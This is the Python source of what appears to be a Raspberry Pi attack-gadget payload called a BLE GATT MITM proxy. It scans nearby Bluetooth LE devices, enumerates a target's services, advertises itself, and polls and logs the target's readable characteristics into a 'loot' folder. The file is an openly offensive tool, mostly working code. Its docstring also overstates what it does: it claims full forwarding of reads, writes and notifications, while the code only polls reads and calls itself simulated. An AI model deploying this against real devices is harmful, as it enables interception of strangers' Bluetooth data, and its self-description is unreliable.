#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE GATT MITM Proxy
=========================================
Author: 7h30th3r0n3

Scan BLE devices, select a target, connect and enumerate all GATT
services/characteristics.  Set up the Pi as a BLE peripheral advertising
the same services.  When a client connects to the Pi, forward all
read/write/notify operations to the real device, logging all traffic.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez
- gatttool, hcitool available
- Optional: second BT adapter for simultaneous client + peripheral

Controls
--------
  OK         -- Select target / connect
  UP / DOWN  -- Scroll devices / log
  KEY1       -- Scan for BLE devices
  KEY2       -- Export GATT traffic log
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/BLE_MITM/
"""

import os
import sys
import time
import json
import re
import asyncio
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via select_bt_interface
LOOT_DIR = "/root/Raspyjack/loot/BLE_MITM"
ROWS_VISIBLE = 6
ROW_H = 12
VIEWS = ["devices", "log"]

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []           # [{addr, name}]
gatt_services = []     # [{uuid, handle, chars: [{uuid, handle, properties}]}]
gatt_log = []          # [{ts, op, handle, data}]
selected_idx = 0
scroll_pos = 0
view = "devices"
target_addr = ""
target_connected = False
proxy_active = False
client_count = 0
status_msg = "Idle"
_running = True
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def _hci_reset():
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "reset"],
                   capture_output=True, timeout=5)


# ── BLE scan (bleak) ─────────────────────────────────────────────────────────

async def _bleak_scan(timeout=8):
    """Discover BLE devices using bleak (async)."""
    from bleak import BleakScanner
    found = await BleakScanner.discover(timeout=timeout)
    return [
        (d.address.upper(), d.name or "", getattr(d, "rssi", -99))
        for d in found
    ]


def _scan_ble():
    """Scan for BLE devices using bleak."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning BLE..."

    _hci_up()

    try:
        results = asyncio.run(_bleak_scan(8))
        found = {}
        for addr, name, _rssi in results:
            if addr not in found or (name and not found[addr]):
                found[addr] = name

        result = [{"addr": a, "name": n or a[-8:]} for a, n in found.items()]
        with lock:
            devices.clear()
            devices.extend(result)
            status_msg = f"Found {len(result)} BLE devs"
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]
    finally:
        with lock:
            _scan_active = False


# ── GATT enumeration ────────────────────────────────────────────────────────

def _enumerate_gatt(addr):
    """Connect to target and enumerate GATT services/characteristics."""
    global gatt_services, status_msg

    with lock:
        status_msg = f"GATT enum {addr[-8:]}"

    services = []

    # Get primary services
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--primary"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.strip().split("\n"):
            # attr handle = 0x0001, end grp handle = 0x000b uuid: 00001800-...
            match = re.search(
                r"attr handle\s*=\s*(0x[0-9a-fA-F]+).*uuid:\s*(\S+)",
                line, re.IGNORECASE,
            )
            if match:
                services.append({
                    "handle": match.group(1),
                    "uuid": match.group(2),
                    "chars": [],
                })
    except Exception as exc:
        with lock:
            status_msg = f"Enum err: {str(exc)[:14]}"
        return

    # Get characteristics
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--characteristics"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.strip().split("\n"):
            # handle = 0x0002, char properties = 0x02, char value handle = 0x0003,
            # uuid = 00002a00-...
            match = re.search(
                r"handle\s*=\s*(0x[0-9a-fA-F]+).*properties\s*=\s*(0x[0-9a-fA-F]+)"
                r".*uuid\s*=\s*(\S+)",
                line, re.IGNORECASE,
            )
            if match:
                char_entry = {
                    "handle": match.group(1),
                    "properties": match.group(2),
                    "uuid": match.group(3),
                }
                # Assign to the right service
                if services:
                    services[-1]["chars"].append(char_entry)
    except Exception:
        pass

    with lock:
        gatt_services = list(services)
        status_msg = f"Enum: {len(services)} svcs"


# ── GATT read helper ────────────────────────────────────────────────────────

def _gatt_read(addr, handle):
    """Read a GATT characteristic value."""
    try:
        result = subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--char-read", "-a", handle],
            capture_output=True, text=True, timeout=10,
        )
        # Characteristic value/descriptor: aa bb cc ...
        match = re.search(r":\s*((?:[0-9a-fA-F]{2}\s*)+)", result.stdout)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return ""


def _gatt_write(addr, handle, value):
    """Write a value to a GATT characteristic."""
    try:
        subprocess.run(
            ["sudo", "gatttool", "-b", addr, "--char-write-req",
             "-a", handle, "-n", value],
            capture_output=True, text=True, timeout=10,
        )
        return True
    except Exception:
        return False


# ── Proxy thread ─────────────────────────────────────────────────────────────

def _proxy_loop():
    """
    Main MITM proxy loop: advertise as a peripheral, forward operations.
    Uses hcitool for advertising and gatttool for target communication.
    """
    global proxy_active, client_count, status_msg

    with lock:
        addr = target_addr
        svcs = list(gatt_services)

    if not addr or not svcs:
        with lock:
            status_msg = "No target/services"
        return

    with lock:
        proxy_active = True
        status_msg = "Proxy active"

    # Set up advertising with target's name
    try:
        # Enable LE advertising
        subprocess.run(
            ["sudo", "hciconfig", HCI_DEV, "leadv", "0"],
            capture_output=True, timeout=5,
        )
        with lock:
            status_msg = "Advertising..."
    except Exception as exc:
        with lock:
            status_msg = f"Adv err: {str(exc)[:14]}"
            proxy_active = False
        return

    # Monitor loop: periodically read all characteristics from target
    # and log changes (simulated proxy since full GATT server requires
    # more complex setup)
    prev_values = {}

    while True:
        with lock:
            if not proxy_active:
                break

        now_str = datetime.now().strftime("%H:%M:%S")

        for svc in svcs:
            for char in svc.get("chars", []):
                with lock:
                    if not proxy_active:
                        break
                handle = char["handle"]
                props = int(char.get("properties", "0x00"), 16)

                # Only read if readable (bit 1)
                if props & 0x02:
                    val = _gatt_read(addr, handle)
                    if val:
                        key = handle
                        with lock:
                            if key not in prev_values or prev_values[key] != val:
                                prev_values[key] = val
                                gatt_log.append({
                                    "ts": now_str,
                                    "op": "READ",
                                    "handle": handle,
                                    "uuid": char["uuid"][-8:],
                                    "data": val[:20],
                                })
                                client_count = len(gatt_log)

        time.sleep(2)

    # Stop advertising
    try:
        subprocess.run(
            ["sudo", "hciconfig", HCI_DEV, "noleadv"],
            capture_output=True, timeout=5,
        )
    except Exception:
        pass


# ── Start / stop ─────────────────────────────────────────────────────────────

def _connect_target(addr):
    """Connect to target: enumerate GATT then start proxy."""
    global target_addr, target_connected

    _enumerate_gatt(addr)

    with lock:
        target_addr = addr
        target_connected = True

    threading.Thread(target=_proxy_loop, daemon=True).start()


def _stop_proxy():
    global proxy_active, target_connected, status_msg
    with lock:
        proxy_active = False
        target_connected = False
        status_msg = "Proxy stopped"
    time.sleep(0.5)
    _hci_reset()


# ── Export ───────────────────────────────────────────────────────────────────

def _export_log():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"ble_mitm_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "target": target_addr,
            "services": list(gatt_services),
            "gatt_log": list(gatt_log),
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ── Drawing ──────────────────────────────────────────────────────────────────

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        msg = status_msg
        devs = list(devices)
        sp = scroll_pos
        sel = selected_idx
        cur_view = view
        tgt = target_addr
        tgt_conn = target_connected
        prx = proxy_active
        logs = list(gatt_log)
        n_ops = len(logs)
        scan_on = _scan_active

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BLE MITM", font=font, fill="#9C27B0")
    if prx:
        d.ellipse((118, 3, 126, 11), fill="#00FF00")
    elif scan_on:
        d.ellipse((118, 3, 126, 11), fill="#FFAA00")
    else:
        d.ellipse((118, 3, 126, 11), fill="#FF0000")

    y = 15
    d.text((2, y), msg[:22], font=font, fill="#888")
    y += 12

    if tgt:
        d.text((2, y), f"Tgt: {tgt[-11:]}", font=font, fill="#00FF00" if tgt_conn else "#FF4444")
        y += 12
    d.text((2, y), f"GATT ops: {n_ops}", font=font, fill="#FFAA00")
    y += 13

    if cur_view == "devices":
        end = min(sp + ROWS_VISIBLE, len(devs))
        for i in range(sp, end):
            dev = devs[i]
            prefix = ">" if i == sel else " "
            name = dev["name"][:16]
            clr = "#FFAA00" if i == sel else "#CCCCCC"
            d.text((2, y), f"{prefix}{name}", font=font, fill=clr)
            y += ROW_H
        if not devs:
            d.text((2, y), "K1 to scan", font=font, fill="#555")

    elif cur_view == "log":
        end = min(sp + ROWS_VISIBLE, len(logs))
        for i in range(sp, end):
            entry = logs[i]
            txt = f"{entry['ts']} {entry['op']} {entry.get('uuid', '')}"
            d.text((2, y), txt[:22], font=font, fill="#CCCCCC")
            y += ROW_H
        if not logs:
            d.text((2, y), "No GATT traffic", font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Sel K1:Scan K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global scroll_pos, selected_idx, status_msg, view, HCI_DEV

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True, timeout=5)
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BLE MITM PROXY", font=font, fill="#9C27B0")
    d.text((4, 28), "GATT man-in-the-middle", font=font, fill="#888")
    d.text((4, 40), "proxy for BLE devices.", font=font, fill="#888")
    d.text((4, 60), "K1=Scan  OK=Connect", font=font, fill="#666")
    d.text((4, 72), "L/R=View  K2=Export", font=font, fill="#666")
    d.text((4, 84), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "KEY1":
                if not _scan_active:
                    threading.Thread(target=_scan_ble, daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK":
                with lock:
                    devs = list(devices)
                    sel = selected_idx
                    prx = proxy_active
                if prx:
                    _stop_proxy()
                elif devs and 0 <= sel < len(devs):
                    addr = devs[sel]["addr"]
                    threading.Thread(
                        target=_connect_target, args=(addr,), daemon=True,
                    ).start()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    scroll_pos = max(0, scroll_pos - 1)
                    if view == "devices":
                        selected_idx = max(0, selected_idx - 1)
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    scroll_pos += 1
                    if view == "devices":
                        selected_idx = min(len(devices) - 1, selected_idx + 1)
                time.sleep(0.2)

            elif btn == "LEFT" or btn == "RIGHT":
                with lock:
                    view = "log" if view == "devices" else "devices"
                    scroll_pos = 0
                time.sleep(0.25)

            elif btn == "KEY2":
                path = _export_log()
                with lock:
                    status_msg = "Log exported"
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_proxy()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
